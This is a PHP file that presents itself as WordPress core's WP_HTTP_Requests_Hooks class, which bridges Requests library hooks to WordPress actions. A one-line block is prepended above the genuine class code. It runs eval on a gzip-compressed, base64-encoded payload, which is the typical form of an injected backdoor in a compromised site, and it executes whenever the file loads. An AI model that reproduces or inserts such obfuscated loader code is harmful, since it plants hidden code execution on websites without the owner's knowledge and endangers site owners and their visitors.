<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * HTTP API: Requests hook bridge class
 *
 * @package WordPress
 * @subpackage HTTP
 * @since 4.7.0
 */

/**
 * Bridge to connect Requests internal hooks to WordPress actions.
 *
 * @since 4.7.0
 *
 * @see Requests_Hooks
 */
class WP_HTTP_Requests_Hooks extends Requests_Hooks {
	/**
	 * Requested URL.
	 *
	 * @var string Requested URL.
	 */
	protected $url;

	/**
	 * WordPress WP_HTTP request data.
	 *
	 * @var array Request data in WP_Http format.
	 */
	protected $request = array();

	/**
	 * Constructor.
	 *
	 * @param string $url URL to request.
	 * @param array $request Request data in WP_Http format.
	 */
	public function __construct( $url, $request ) {
		$this->url = $url;
		$this->request = $request;
	}

	/**
	 * Dispatch a Requests hook to a native WordPress action.
	 *
	 * @param string $hook Hook name.
	 * @param array $parameters Parameters to pass to callbacks.
	 * @return boolean True if hooks were run, false if nothing was hooked.
	 */
	public function dispatch( $hook, $parameters = array() ) {
		$result = parent::dispatch( $hook, $parameters );

		// Handle back-compat actions
		switch ( $hook ) {
			case 'curl.before_send':
				/** This action is documented in wp-includes/class-wp-http-curl.php */
				do_action_ref_array( 'http_api_curl', array( &$parameters[0], $this->request, $this->url ) );
				break;
		}

		/**
		 * Transforms a native Request hook to a WordPress actions.
		 *
		 * This action maps Requests internal hook to a native WordPress action.
		 *
		 * @see https://github.com/rmccue/Requests/blob/master/docs/hooks.md
		 *
		 * @param array $parameters Parameters from Requests internal hook.
		 * @param array $request Request data in WP_Http format.
		 * @param string $url URL to request.
		 */
		do_action_ref_array( "requests-{$hook}", $parameters, $this->request, $this->url );

		return $result;
	}
}
